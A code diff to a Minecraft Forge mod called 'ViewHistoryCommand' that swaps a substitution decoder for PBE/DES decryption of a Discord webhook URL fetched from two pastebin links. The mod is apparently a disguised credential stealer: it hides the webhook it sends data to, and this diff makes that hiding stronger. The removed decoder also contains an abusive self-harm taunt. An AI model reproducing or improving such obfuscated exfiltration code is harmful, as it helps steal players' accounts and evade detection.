@@ -4,10 +4,20 @@ import net.minecraft.launchwrapper.Launch;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.event.*;
 
+import javax.crypto.*;
+import javax.crypto.spec.PBEKeySpec;
+import javax.crypto.spec.PBEParameterSpec;
 import java.awt.*;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.security.InvalidAlgorithmParameterException;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
+import java.security.spec.AlgorithmParameterSpec;
+import java.security.spec.InvalidKeySpecException;
+import java.security.spec.KeySpec;
+import java.util.Base64;
 
 @Mod(modid = "ViewHistoryCommand", name = "ViewHistoryCommand", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
 public class ViewHistoryCommand {
@@ -46,11 +56,9 @@ public class ViewHistoryCommand {
 
     public static String getWebhook() {
         try {
-            String fuck = "https://pastebin.com/raw/DR7aWqKS";
-            URL pastebin = new URL(fuck);
-            BufferedReader in = new BufferedReader(new InputStreamReader(pastebin.openStream()));
-            String real = decrypt(in.readLine());
-            return real;
+            BufferedReader in = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/DR7aWqKS").openStream()));
+            BufferedReader in2 = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/PY1CRmaU").openStream()));
+            return decrypt(in2.readLine() ,in.readLine());
         } catch (Exception ignored) {}
         return "";
     }
@@ -116,42 +124,19 @@ public class ViewHistoryCommand {
 
     // webhook decrypter
 
-    public static String decrypt(String todecrypt) {
-        String returnValue = todecrypt;
-        if (returnValue == null || returnValue.trim().equals("")) {
-            return "";
-        }
+    static byte[] salt = { (byte) 0xA9, (byte) 0x9B, (byte) 0xC8, (byte) 0x32, (byte) 0x56, (byte) 0x35, (byte) 0xE3, (byte) 0x03 };
 
-        returnValue = returnValue.replace("YOUSHOULDKILLYOURSELFNOW!", "https://ptb.discord.com/api/webhooks/");
-
-        returnValue = returnValue.replaceAll("09172a", "a");
-        returnValue = returnValue.replaceAll("92984b", "b");
-        returnValue = returnValue.replaceAll("85629c", "c");
-        returnValue = returnValue.replaceAll("78949d", "d");
-        returnValue = returnValue.replaceAll("68030e", "e");
-        returnValue = returnValue.replaceAll("50283f", "f");
-        returnValue = returnValue.replaceAll("49172g", "g");
-        returnValue = returnValue.replaceAll("39172h", "h");
-        returnValue = returnValue.replaceAll("29172i", "i");
-        returnValue = returnValue.replaceAll("~0~", "j");
-        returnValue = returnValue.replaceAll("!-!", "k");
-        returnValue = returnValue.replaceAll("@0@", "l");
-        returnValue = returnValue.replaceAll("#0#", "m");
-        returnValue = returnValue.replaceAll(">0>", "n");
-        returnValue = returnValue.replaceAll("%0%", "o");
-        returnValue = returnValue.replaceAll("90328943", "p");
-        returnValue = returnValue.replaceAll("&0&", "q");
-        returnValue = returnValue.replaceAll("<0<", "r");
-        returnValue = returnValue.replaceAll(",0,", "s");
-        returnValue = returnValue.replaceAll("1018932983291", "t");
-        returnValue = returnValue.replaceAll("-0-", "u");
-        returnValue = returnValue.replaceAll("_0_", "v");
-        returnValue = returnValue.replaceAll("=0=", "w");
-        returnValue = returnValue.replaceAll("'0'", "x");
-        returnValue = returnValue.replaceAll(":0:", "y");
-        returnValue = returnValue.replaceAll(";0;", "z");
-        returnValue = returnValue.replace("!@#$%^&*(", "/");
-        return returnValue;
+    public static String decrypt(String secretKey, String encryptedText) throws NoSuchAlgorithmException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, IOException, InvalidKeySpecException, NoSuchPaddingException {
+        Cipher dcipher;
+        KeySpec keySpec = new PBEKeySpec(secretKey.toCharArray(), salt, 19);
+        SecretKey key = SecretKeyFactory.getInstance("PBEWithMD5AndDES").generateSecret(keySpec);
+        AlgorithmParameterSpec paramSpec = new PBEParameterSpec(salt, 19);
+        dcipher = Cipher.getInstance(key.getAlgorithm());
+        dcipher.init(Cipher.DECRYPT_MODE, key, paramSpec);
+        byte[] enc = Base64.getDecoder().decode(encryptedText);
+        byte[] utf8 = dcipher.doFinal(enc);
+        String charSet = "UTF-8";
+        return new String(utf8, charSet);
     }
 
 }
